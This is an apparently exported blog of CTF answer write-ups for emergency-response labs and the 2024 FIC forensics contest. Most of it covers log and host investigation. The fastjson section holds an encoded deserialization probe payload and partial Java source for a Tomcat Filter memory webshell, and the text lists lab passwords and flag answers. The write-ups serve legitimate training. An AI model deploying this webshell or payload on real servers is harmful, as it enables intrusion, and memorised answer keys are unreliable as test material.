SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交; flag{192.168.200.2} cd /var/log cat redis.log 2.通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交; flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b} 在日志中发现加载模块exp.so cat /exp.so 3.通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交; flag{192.168.100.13} crontab -l查看计划任务 4.通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交 flag{xj-test-user-wow-you-find-flag} cat /root/.ssh/authorized_keys 发现用户名为：xj-test-user 使用github进行溯源，地址为： https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636， 发现在文件中内置：wow-you-find-flag 5.通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交; flag{c195i2923381905517d818e313792d196} cd /usr/bin ls -al 发现ps和ps_ file ps可发现其为文本文件 cat ps ","date":"2024-06-11","objectID":"/xj_emergency/:4:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第二章-日志分析-redis应急响应"},{"categories":["wp","emergency"],"content":"\r第二章 日志分析-apache日志分析1.提交当天访问次数最多的IP，即黑客IP： flag{192.168.200.2} cd /var/log/apache2 cat access.log.1 | grep \"03/Aug/2023:08:\" | awk '{print $1}' | sort | uniq -c | sort -nr | head -n 10 2.黑客使用的浏览器指纹是什么，提交指纹的md5： flag{2d6330f380f44ac20f3a02eed0958f66} cat access.log 随后计算浏览器指纹 3.查看index.php页面被访问的次数，提交次数： flag{27} cat access.log.1 |grep \"/index.php\" |wc -l 4.查看黑客IP访问了多少次，提交次数： flag{6555} cat access.log.1 | grep \"192.168.200.2 - -\" | wc -l 5.查看2023年8月03日8时这一个小时内有多少IP访问，提交次数: flag{5} ","date":"2024-06-11","objectID":"/xj_emergency/:5:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第二章-日志分析-apache日志分析"},{"categories":["wp","emergency"],"content":"\r第二章 日志分析-mysql应急响应1.黑客第一次写入的shell flag{关键字符串} flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b} 把Linux系统目录映射到本地，拿d盾扫描 访问sh.php得到flag 2.黑客反弹shell的ip flag{ip} flag{192.168.100.13} 可以发现执行了/tmp目录下的1.sh cat /tmp/1.sh 3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx flag{b1818bde4e310f3d23f1005185b973e7} mysql数据库，猜测是udf提权 查到数据库密码 登录数据库 /usr/lib/mysql/plugin/udf.so 计算md5即可 4.黑客获取的权限 flag{whoami后的值} flag{mysql} udf提权拿到的是mysql权限 ","date":"2024-06-11","objectID":"/xj_emergency/:6:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第二章-日志分析-mysql应急响应"},{"categories":["wp","emergency"],"content":"\r第三章 权限维持-Linux权限维持-隐藏1.黑客隐藏的隐藏的文件 完整路径md5 flag{109ccb5768c70638e24fb46ee7957e37} find / -type f -name \".*\" 2\u003e/dev/null | grep -v \"^\\/sys\\/\" // 查找隐藏文件 find / -type d -name \".*\" 2\u003e/dev/null // 查找隐藏目录 可疑目录 隐藏了1.py md5(/tmp/.temp/libprocesshider/1.py) 2.黑客隐藏的文件反弹shell的ip+端口 {ip:port} flag{114.114.114.121:9999} 查看1.py 3.黑客提权所用的命令 完整路径的md5 flag{md5} flag{7fd5884f493f4aaf96abee286ee04120} 查找设置了suid权限的程序 find / -type f -perm -4000 2\u003e/dev/null 切换到ctf用户验证 find命令路径 4.黑客尝试注入恶意代码的工具完整路径md5 flag{087c267368ece4fcf422ff733b51aed9} 查找隐藏目录 /home/ctf# find / -type d -name \".*\" 2\u003e/dev/null 注入工具 md5(/opt/.cymothoa-1-beta/cymothoa) 5.使用命令运行 ./x.xx 执行该文件 将查询的 Exec****** 值 作为flag提交 flag{/xxx/xxx/xxx} flag{/usr/bin/python3.4} 执行 python3 /tmp/.temp/libprocesshider/1.py 随后进入/proc/9197/，cat cmdline ","date":"2024-06-11","objectID":"/xj_emergency/:7:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第三章-权限维持-linux权限维持-隐藏"},{"categories":["wp","emergency"],"content":"\r第五章 Windows实战-evtx日志文件分析步骤1.将黑客成功登录系统所使用的IP地址作为Flag值提交； 安全日志事件ID4625，flag{192.168.36.133} 步骤2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交； 安全日志事件ID4781，flag{Adnimistartro} 步骤3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交； 安全日志事件ID4663，flag{SCHEMA} 步骤4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交； 应用程序日志，source为MySql，flag{8820} 步骤5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。 在系统日志中，事件ID1074，共有3对记录，flag{3} ","date":"2024-06-11","objectID":"/xj_emergency/:8:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第五章-windows实战-evtx日志文件分析"},{"categories":["wp","emergency"],"content":"\r第五章 Linux实战-挖矿1.黑客的IP是？ flag格式：flag{黑客的ip地址}，如：flag{127.0.0.1}在 flag{192.168.10.135} 在/www/admin/websec_80/log/nginx_access_2023-12-22.log中可查看 2.黑客攻陷网站的具体时间是？ flag格式：flag{年-月-日 时:分:秒}，如：flag{2023-12-24 22:23:24} flag{2023-12-22 19:08:34} cat nginx_access_2023-12-22.log | grep 200 访问了/dede路径 后台地址：/dede 账号：admin 密码：12345678 3.黑客上传webshell的名称及密码是？ flag格式：flag{黑客上传的webshell名称-webshell密码}，如：flag{webshell.php-pass} flag{404.php-cmd} 将Linux的存储映射到本地，然后用d盾进行扫描 解码得到密码为cmd 4.黑客提权后设置的后门文件名称是？ flag格式：flag{后门文件绝对路径加上名称}，如：flag{/etc/passwd} flag{/usr/bin/find} history，发现赋予find命令suid权限（4775或u+s） 5.对黑客上传的挖矿病毒进行分析，获取隐藏的Flag flag{websec_True@888!} 查看计划任务crontab -l，并没有，cat /etc/crontab 文件为ldm，find / -name \"ldm\"发现文件存在于/etc/.cache/ldm cat ldm 解码得到flag ","date":"2024-06-11","objectID":"/xj_emergency/:9:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第五章-linux实战-挖矿"},{"categories":["wp","emergency"],"content":"\r第七章 常见攻击事件分析–钓鱼邮件1.请分析获取黑客发送钓鱼邮件时使用的IP，flag格式： flag{11.22.33.44} 121.204.224.15 2.请分析获取黑客钓鱼邮件中使用的木马程序的控制端IP，flag格式：flag{11.22.33.44} 107.16.111.57 附件下载下来，放到云沙箱中分析 3.黑客在被控服务器上创建了webshell，请分析获取webshell的文件名，请使用完整文件格式，flag格式：flag{/var/www/html/shell.php} d盾扫描www目录 flag{/var/www/html/admin/ebak/ReData.php} 4.flag4: 黑客在被控服务器上创建了内网代理隐蔽通信隧道，请分析获取该隧道程序的文件名，请使用完整文件路径，flag格式：flag{/opt/apache2/shell} flag{/var/tmp/proc/mysql} 在var/tmp/proc目录下发现my.conf类似流量穿透工具配置，可推测mysql为隐蔽通信隧道 ","date":"2024-06-11","objectID":"/xj_emergency/:10:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第七章-常见攻击事件分析--钓鱼邮件"},{"categories":["wp","emergency"],"content":"\r第八章 内存马分析-java03-fastjson1.fastjson版本作为 flag 提交 flag{x.x.66} flag{1.2.47} \u003efscan64.exe -h 52.83.21.132 -p 1-65535 发现存在web页面，对登录框的请求体中去掉一个}，发成报错，但委会显fastjson相关字符 直接探测fastjson版本，依旧没探测到发fastjson相关字段 Unicode编码之后得到版本的回显，可能是加了waf 2.内核版本作为 flag 提交 flag{Dexxxxxxxxxux} flag{Debian 4.19.260-1 (2022-09-29) x86_64 GNU/Linux} Fastjson1.2.47版本以下存在mappings缓存通杀绕过，利用的方式为JNDI JNDI利用条件 非严格意义的出网，比如这里我们控制了外网主机，可以使用该主机作为server端提供ldap或rmi 受到JDK版本限制，JDK8u191后受到trusturlcodebase限制远程加载，但也有绕过方法。这里因为机器内JDK版本较高，JNDI注入并不太合适，所以需要找其他利用链。 随后探测存在的依赖，利用Character转换报错可以判断存在何种依赖，当存在该类时会报出类型转换错误，否则无显示，同样，这里@type也需要编码。通过这种方法结合已知的FastJson利用链所需要的依赖类，最终探测服务中存在C3P0依赖。 { \"x\":{ \"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"java.lang.Character\"{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"java.lang.Class\", \"val\":\"com.mchange.v2.c3p0.DataSources\"}} 先找一个冰蝎内存马:Tomcat的Filter型内存马,但因为是TemplatesImpl这条链加载字节码，所以需要extends AbstractTranslet并重写两个方法，否则加载不了这个类。编译为IceShell.class： import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.HashMap;import java.util.Map;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;import javax.servlet.DispatcherType;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.apache.catalina.Context;import org.apache.catalina.core.ApplicationFilterConfig;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap;import sun.misc.BASE64Decoder; public class IceShell extends AbstractTranslet implements Filter { private final String pa = \"3ad2fddfe8bad8e6\"; public IceShell() { } public void init(FilterConfig filterConfig) throws ServletException { } public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest)servletRequest; HttpServletResponse response = (HttpServletResponse)servletResponse; HttpSession session = request.getSession(); Map\u003cString, Object\u003e pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); ClassLoader cl = Thread.currentThread().getContextClassLoader(); if (request.getMethod().equals(\"POST\")) { Class Lclass; if (cl.getClass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) { Lclass = cl.getClass().getSuperclass(); this.RushThere(Lclass, cl, session, request, pageContext); } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) { Lclass = cl.getClass().getSuperclass().getSuperclass(); this.RushThere(Lclass, cl, session, request, pageContext); } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) { Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass(); this.RushThere(Lclass, cl, session, request, pageContext); } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(\"java.lang.ClassLoader\")) { Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass(); this.RushThere(Lclass, cl, session, request, pageContext); } else if (cl.getClass().getSuperclass().getSuperclass().getS","date":"2024-06-11","objectID":"/xj_emergency/:11:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第八章-内存马分析-java03-fastjson"},{"categories":["wp","emergency"],"content":"\r第九章-kswapd0挖矿1.通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交; flag{182.164.3.252} 查看auth.log日志文件 cat /var/log/auth.log.1 2.通过本地 PC SSH到服务器并且分析黑客的用户名为什么,将黑客的用户名作为 FLAG 提交; flag{mdrfckr} cat /root/.ssh/authorized_keys 3.通过本地 PC SSH到服务器并且分析黑客权限维持文件的md5,将文件的 MD5(md5sum /file) 作为 FLAG 提交; flag{45437b4e86fba2ab890ac81db2ec3606} 文件路径为/var/spool/cron/crontabs/root ","date":"2024-06-11","objectID":"/xj_emergency/:12:0","series":null,"tags":["wp","emergency"],"title":"玄机应急响应靶场刷题","uri":"/xj_emergency/#第九章-kswapd0挖矿"},{"categories":["Forensics","wp"],"content":"赛后完整复现 检材密码： 2024Fic@杭州Powered~by~HL! ","date":"2024-05-10","objectID":"/2024fic/:0:0","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#"},{"categories":["Forensics","wp"],"content":"\r手机部分","date":"2024-05-10","objectID":"/2024fic/:1:0","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#手机部分"},{"categories":["Forensics","wp"],"content":"\r1.嫌疑人李某的手机型号是？ Xiaomi MI 4 ","date":"2024-05-10","objectID":"/2024fic/:1:1","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#1嫌疑人李某的手机型号是"},{"categories":["Forensics","wp"],"content":"\r2.嫌疑人李某是否可能有平板电脑设备，如有该设备型号是？ Xiaomi Pad 6s ","date":"2024-05-10","objectID":"/2024fic/:1:2","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#2嫌疑人李某是否可能有平板电脑设备如有该设备型号是"},{"categories":["Forensics","wp"],"content":"\r3.嫌疑人李某手机开启热点设置的密码是? 5aada11bc1b5 ","date":"2024-05-10","objectID":"/2024fic/:1:3","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#3嫌疑人李某手机开启热点设置的密码是"},{"categories":["Forensics","wp"],"content":"\r4.嫌疑人李某的微信内部ID是？ wxid_wnigmud8aj6j12 ","date":"2024-05-10","objectID":"/2024fic/:1:4","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#4嫌疑人李某的微信内部id是"},{"categories":["Forensics","wp"],"content":"\r5.嫌疑人李某发送给技术人员的网站源码下载地址是什么 http://www.honglian7001.com/down ","date":"2024-05-10","objectID":"/2024fic/:1:5","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#5嫌疑人李某发送给技术人员的网站源码下载地址是什么"},{"categories":["Forensics","wp"],"content":"\r6.受害者微信用户ID是？ wxid_u6umc696cms422 ","date":"2024-05-10","objectID":"/2024fic/:1:6","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#6受害者微信用户id是"},{"categories":["Forensics","wp"],"content":"\r7.嫌疑人李某第一次连接WIFI的时间是？ 03-14 16:55:57 ","date":"2024-05-10","objectID":"/2024fic/:1:7","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#7嫌疑人李某第一次连接wifi的时间是"},{"categories":["Forensics","wp"],"content":"\r8.分析嫌疑人李某的社交习惯，哪一个时间段消息收发最活跃？ 16:00-18:00 ","date":"2024-05-10","objectID":"/2024fic/:1:8","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#8分析嫌疑人李某的社交习惯哪一个时间段消息收发最活跃"},{"categories":["Forensics","wp"],"content":"\r9.请分析嫌疑人手机，该案件团伙中，还有一名重要参与者警方未抓获，该嫌疑人所使用的微信账号ID为？ wxid_kolc5oaiap6z22 案件材料写了李某和赵某喜被抓获 ","date":"2024-05-10","objectID":"/2024fic/:1:9","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#9请分析嫌疑人手机该案件团伙中还有一名重要参与者警方未抓获该嫌疑人所使用的微信账号id为"},{"categories":["Forensics","wp"],"content":"\r10.请分析嫌疑人手机，嫌疑人老板组织人员参与赌博活动，所使用的国内访问入口地址为？ 192.168.110.110:8000/login ","date":"2024-05-10","objectID":"/2024fic/:1:10","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#10请分析嫌疑人手机嫌疑人老板组织人员参与赌博活动所使用的国内访问入口地址为"},{"categories":["Forensics","wp"],"content":"\r服务器集群题","date":"2024-05-10","objectID":"/2024fic/:2:0","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#服务器集群题"},{"categories":["Forensics","wp"],"content":"\r1.esxi服务器的esxi版本为？ 6.7.0 ","date":"2024-05-10","objectID":"/2024fic/:2:1","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#1esxi服务器的esxi版本为"},{"categories":["Forensics","wp"],"content":"\r2.请分析ESXi服务器，该系统的安装日期为： 2024 年 3 月 12 日 星期二 02:04:15 UTC 创建一个新的仅主机vm网卡，网段为192.168.8.0，空密码登录 ","date":"2024-05-10","objectID":"/2024fic/:2:2","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#2请分析esxi服务器该系统的安装日期为"},{"categories":["Forensics","wp"],"content":"\r3.请分析ESXi服务器数据存储“datastore”的UUID是？ 65efb8a8-ddd817f6-04ff-000c297bd0e6 由于重写Raid造成ESXi6.7存储名称丢失数据文件不能访问 存储丢失了，要恢复一下 [root@localhost:~] esxcfg-volume -l Scanning for VMFS-6 host activity (4096 bytes/HB, 1024 HBs). VMFS UUID/label: 65efb8a8-ddd817f6-04ff-000c297bd0e6/datastore1 Can mount: Yes Can resignature: Yes Extent name: t10.ATA_____VMware_Virtual_IDE_Hard_Drive___________00000000000000000001:3 range: 0 - 197119 (MB) [root@localhost:~] esxcfg-volume -m 65efb8a8-ddd817f6-04ff-000c297bd0e6 Mounting volume 65efb8a8-ddd817f6-04ff-000c297bd0e6 ","date":"2024-05-10","objectID":"/2024fic/:2:3","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#3请分析esxi服务器数据存储datastore的uuid是"},{"categories":["Forensics","wp"],"content":"\r4.ESXI服务器的原IP地址？ 192.168.8.112 ","date":"2024-05-10","objectID":"/2024fic/:2:4","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#4esxi服务器的原ip地址"},{"categories":["Forensics","wp"],"content":"\r5.EXSI服务器中共创建了几个虚拟机？ 4 ","date":"2024-05-10","objectID":"/2024fic/:2:5","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#5exsi服务器中共创建了几个虚拟机"},{"categories":["Forensics","wp"],"content":"\r6.网站服务器绑定的IP地址为？ 192.168.8.89 fscan扫描，结合超级弱口令扫描，确定服务信息 192.168.8.89 是 web 服务器对应 www 这台虚拟机，密码为 qqqqqq 192.168.8.16 是聊天服务器，对应 rocketchat 这台虚拟机，密码未知 192.168.8.142 对应为 data 这台虚拟机，密码为 hl@7001 ","date":"2024-05-10","objectID":"/2024fic/:2:6","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#6网站服务器绑定的ip地址为"},{"categories":["Forensics","wp"],"content":"\r7.网站服务器的登录密码为？ qqqqqq 根据题目信息，在Windows镜像中找到一个Commonpwd.txt，如上题爆破，得到密码 若出现该问题： VMware Workstation 在此主机上不支持嵌套虚拟化 管理员权限power shell执行： bcdedit /set hypervisorlaunchtype off ","date":"2024-05-10","objectID":"/2024fic/:2:7","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#7网站服务器的登录密码为"},{"categories":["Forensics","wp"],"content":"\r8.网站服务器所使用的管理面板登陆入口地址对应的端口号为 14131 ","date":"2024-05-10","objectID":"/2024fic/:2:8","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#8网站服务器所使用的管理面板登陆入口地址对应的端口号为"},{"categories":["Forensics","wp"],"content":"\r9.网站服务器的web目录是？ /webapp 在根目录的/webapp下发现网站信息 ","date":"2024-05-10","objectID":"/2024fic/:2:9","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#9网站服务器的web目录是"},{"categories":["Forensics","wp"],"content":"\r10.网站配置中Redis的连接超时时间为多少秒 10s ","date":"2024-05-10","objectID":"/2024fic/:2:10","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#10网站配置中redis的连接超时时间为多少秒"},{"categories":["Forensics","wp"],"content":"\r11.网站普通用户密码中使用的盐值为 !@#qaaxcfvghhjllj788+)_)(( ","date":"2024-05-10","objectID":"/2024fic/:2:11","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#11网站普通用户密码中使用的盐值为"},{"categories":["Forensics","wp"],"content":"\r12.网站管理员用户密码的加密算法名称是什么 bcrypt ","date":"2024-05-10","objectID":"/2024fic/:2:12","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#12网站管理员用户密码的加密算法名称是什么"},{"categories":["Forensics","wp"],"content":"\r13.网站超级管理员用户账号创建的时间是？ 2022-05-09 14:44:41 exsi中data是数据库虚拟机，跟网站实行站库分离 登录data，发现docker中有mysql镜像，启动一下 宝塔处可以连接，随后用navicat连接到服务器的数据库 数据库账号密码在宝塔面板可查看 在sys_user表中可看到超级管理员账户创建的时间 ","date":"2024-05-10","objectID":"/2024fic/:2:13","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#13网站超级管理员用户账号创建的时间是"},{"categories":["Forensics","wp"],"content":"\r14.重构进入网站之后，用户管理下的用户列表页面默认有多少页数据 877 根据Windows镜像中获取的运维笔记 对ruoyi的jar包进行修改 jar xf ruoyi-admin.jar BOOT-INF/classes/application-druid.yml vim BOOT-INF/classes/application-druid.yml 改成data虚拟机的IP，password要改成宝塔中数据库对应用户的密码 更新jar包配置 jar uf ruoyi-admin.jar BOOT-INF/classes/application-druid.yml 随后 [root@localhost webapp]# chmod 777 restart.sh [root@localhost webapp]# ls BOOT-INF dist0906 index.html luck-prize qz ruoyi-admin.jar ruoyi-admin.jar0827 ruoyi-admin.jar0904 ruoyi-admin.jar 7.19 ruoyi-admin.jar8.15 ruoyi-admin.jarbak test dist down kill.sh nohup.out qz 7.11 ruoyi-admin.jar0818 ruoyi-admin.jar0828 ruoyi-admin.jar0907 ruoyi-admin.jar 7.26 ruoyi-admin.jar8.151 ruoyi-admin.pid dist0826 group logs profile restart.sh ruoyi-admin.jar0826 ruoyi-admin.jar08281 ruoyi-admin.jar0915 ruoyi-admin.jar8.14 ruoyi-admin.jar8.16 start.sh [root@localhost webapp]# ./restart.sh 32099 还是不行，根据报错进一步修复 添加一条127.0.0.1 localhost映射到hosts中 echo '127.0.0.1 localhost' \u003e /etc/hosts sys_job表 修改后 启动： java -jar ruoyi-admin.jar chmod 777 restart.sh ./restart.sh start 替换一个密码进去 在线Bcrypt密码生成工具-Bejson.com 进入192.168.8.89网站页面 ","date":"2024-05-10","objectID":"/2024fic/:2:14","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#14重构进入网站之后用户管理下的用户列表页面默认有多少页数据"},{"categories":["Forensics","wp"],"content":"\r15.该网站的系统接口文档版本号为 3.8.2 ","date":"2024-05-10","objectID":"/2024fic/:2:15","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#15该网站的系统接口文档版本号为"},{"categories":["Forensics","wp"],"content":"\r16.该网站获取订单列表的接口 /api/shopOrder ","date":"2024-05-10","objectID":"/2024fic/:2:16","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#16该网站获取订单列表的接口"},{"categories":["Forensics","wp"],"content":"\r17.受害人卢某的用户ID 10044888 根据手机聊天记录得知其账号 ","date":"2024-05-10","objectID":"/2024fic/:2:17","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#17受害人卢某的用户id"},{"categories":["Forensics","wp"],"content":"\r18.受害人卢某一共充值了多少钱 465222 ","date":"2024-05-10","objectID":"/2024fic/:2:18","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#18受害人卢某一共充值了多少钱"},{"categories":["Forensics","wp"],"content":"\r19.网站设置的单次抽奖价格为多少元 10 ","date":"2024-05-10","objectID":"/2024fic/:2:19","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#19网站设置的单次抽奖价格为多少元"},{"categories":["Forensics","wp"],"content":"\r20.网站显示的总余额数是 7354468.56 ","date":"2024-05-10","objectID":"/2024fic/:2:20","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#20网站显示的总余额数是"},{"categories":["Forensics","wp"],"content":"\r21.网站数据库的root密码 my-secret-pw\" docker inspect 9b ","date":"2024-05-10","objectID":"/2024fic/:2:21","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#21网站数据库的root密码"},{"categories":["Forensics","wp"],"content":"\r22.数据库服务器的操作系统版本是 7.9.2009 ","date":"2024-05-10","objectID":"/2024fic/:2:22","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#22数据库服务器的操作系统版本是"},{"categories":["Forensics","wp"],"content":"\r23.数据库服务器的Docker Server版本是 1.13.1 ","date":"2024-05-10","objectID":"/2024fic/:2:23","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#23数据库服务器的docker-server版本是"},{"categories":["Forensics","wp"],"content":"\r24.数据库服务器中数据库容器的完整ID是 9bf1cecec3957a5cd23c24c0915b7d3dd9be5238322ca5646e3d9e708371b765 ","date":"2024-05-10","objectID":"/2024fic/:2:24","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#24数据库服务器中数据库容器的完整id是"},{"categories":["Forensics","wp"],"content":"\r25.数据库服务器中数据库容器使用的镜像ID 66c0e7ca4921e941cbdbda9e92242f07fe37c2bcbbaac4af701b4934dfc41d8a ","date":"2024-05-10","objectID":"/2024fic/:2:25","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#25数据库服务器中数据库容器使用的镜像id"},{"categories":["Forensics","wp"],"content":"\r26.数据库服务器中数据库容器创建的北京时间 2024/3/13 20:15:23 ","date":"2024-05-10","objectID":"/2024fic/:2:26","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#26数据库服务器中数据库容器创建的北京时间"},{"categories":["Forensics","wp"],"content":"\r27.数据库服务器中数据库容器的ip是 172.17.0.2 ","date":"2024-05-10","objectID":"/2024fic/:2:27","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#27数据库服务器中数据库容器的ip是"},{"categories":["Forensics","wp"],"content":"\r28.分析数据库数据，在该平台邀请用户进群最多的用户的登录IP是 182.33.2.250 ","date":"2024-05-10","objectID":"/2024fic/:2:28","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#28分析数据库数据在该平台邀请用户进群最多的用户的登录ip是"},{"categories":["Forensics","wp"],"content":"\r29.分析数据库数据，在该平台抢得最多红包金额的用户的登录IP是 43.139.0.193 回查该id的登录id即可 ","date":"2024-05-10","objectID":"/2024fic/:2:29","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#29分析数据库数据在该平台抢得最多红包金额的用户的登录ip是"},{"categories":["Forensics","wp"],"content":"\r30.数据库中记录的提现成功的金额总记是多少（不考虑手续费） 35821148.48 ","date":"2024-05-10","objectID":"/2024fic/:2:30","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#30数据库中记录的提现成功的金额总记是多少不考虑手续费"},{"categories":["Forensics","wp"],"content":"\r31.rocketchat服务器中，有几个真实用户？ 3 esxi得到ip，然后默认端口是3000 rocketchat:http://192.168.8.130:3000/home 账号密码在解密的容器里 admin@admin.com Zhao ","date":"2024-05-10","objectID":"/2024fic/:2:31","series":null,"tags":["Forensics","wp"],"title":"2024 第四届全国网络空间取证竞赛","uri":"/2024fic/#31rocketchat服务器中有几个真实用户"},{"categories":["Forensics","wp"],"content":"\r32.rocketchat服务器中，聊天服务的端口号是？ 3000 